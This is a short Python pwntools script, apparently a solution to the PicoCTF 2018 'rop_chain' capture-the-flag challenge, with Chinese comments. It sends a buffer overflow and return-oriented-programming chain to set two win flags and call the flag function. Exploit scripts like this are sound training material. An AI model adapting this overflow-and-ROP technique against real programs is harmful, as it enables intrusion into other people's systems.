#Made by fly_autumn
#x86 ret2rop
from pwn import *
p = process("./PicoCTF_2018_rop_chain")
elf = ELF("./PicoCTF_2018_rop_chain")
context(os="linux",arch="i386")

offset = 28
vuln_plt = 0x8048714
gets_plt = elf.plt["gets"]
win1_addr = 0x804a041
win2_addr = 0x804a042
flag_plt = 0x804862b

payload = b"A"*28 + p32(gets_plt) + p32(vuln_plt) + p32(win1_addr)
p.recvuntil(b"input> ")
p.sendline(payload)
p.sendline(b"1") #win1已准备

p.recvuntil(b"input> ")
payload2 = b"A"*28 + p32(gets_plt) + p32(vuln_plt) + p32(win2_addr)
p.sendline(payload2)
p.sendline(b"1") #win2已准备

p.recvuntil(b"input> ")
a1 = 0xdeadbaad
payload3 = b"A"*28 + p32(flag_plt) + p32(vuln_plt) + p32(a1)
p.sendline(payload3)
#这道题我用的是非预期解法，所以代码相对来说较为冗长，实际上也可以使用题目中已有的函数

p.interactive()
